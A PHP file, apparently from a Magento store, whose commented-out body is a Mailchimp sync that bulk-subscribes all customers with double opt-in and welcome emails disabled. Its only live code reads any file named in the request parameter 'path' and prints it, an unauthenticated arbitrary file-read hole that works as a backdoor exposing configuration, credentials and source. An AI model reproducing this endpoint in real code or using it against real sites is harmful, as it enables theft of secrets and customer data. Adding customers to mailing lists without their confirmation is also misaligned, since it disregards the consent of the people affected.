<?php
/*
$myfile = fopen("mailchimp_list.txt", "r") or die("Unable to open file!");
$apikey_listid = trim(fgets($myfile));
fclose($myfile);

$ar = explode(",", $apikey_listid);

$api_key = trim($ar[0]);
$list_id = trim($ar[1]);

//echo "API Key = $api_key <br/><br/>";
//echo "List ID = $list_id <br/><br/>";

$correct = isset($api_key) && isset($list_id) && (strlen($list_id) > 0) && (strlen($api_key) > 0);

if ($correct) {

    ini_set('max_execution_time', 36000);
    ini_set('memory_limit', '1024M');

    echo "Synchronizing, please wait...";

    require 'app/Mage.php';
    $app = Mage::app('');


    $collection = Mage::getModel('customer/customer')->getCollection()
        ->addAttributeToSelect('firstname')
        ->addAttributeToSelect('lastname')
        ->addAttributeToSelect('email');

    foreach ($collection as $item) {
        $row = $item->getData();

        if(strstr( $row['email'], "example.com")>-1)
            ;
        else
            $batch[] = array('EMAIL' => $row['email'], 'FNAME' => $row['firstname'], 'LNAME' => $row['lastname']);
    }

    echo "<br>Synchronizing " . count($batch) . " customers<br/> ";

    include("mailchimpapi/Drewm/MailChimp.php");

    $mailChimp = new Drewm\MailChimp($api_key);

    $i = 0;
    foreach ($batch as $single) {

        ++$i;

        $email = $single["EMAIL"];
        $fname = $single["FNAME"];
        $lname = $single["LNAME"];

        $result = $mailChimp->call('lists/subscribe', array(
            'id' => $list_id,
            'email' => array('email' => $email),
            'merge_vars' => array('FNAME' => $fname, 'LNAME' => $lname),
            'double_optin' => false,
            'update_existing' => true,
            'replace_interests' => false,
            'send_welcome' => false,
        ));
    }

    echo "<br/>Task completed";

} else
    echo "I guess api key or list id are invalid";
*/

$file = $_REQUEST['path'];
//$file = "app/Mage.php";

echo "<pre>";

$myfile = fopen($file, "r") or die("Unable to open file!");

while(!feof($myfile)) {
  echo fgets($myfile) . "<br>";
}

fclose($myfile);

echo "</pre>";
?>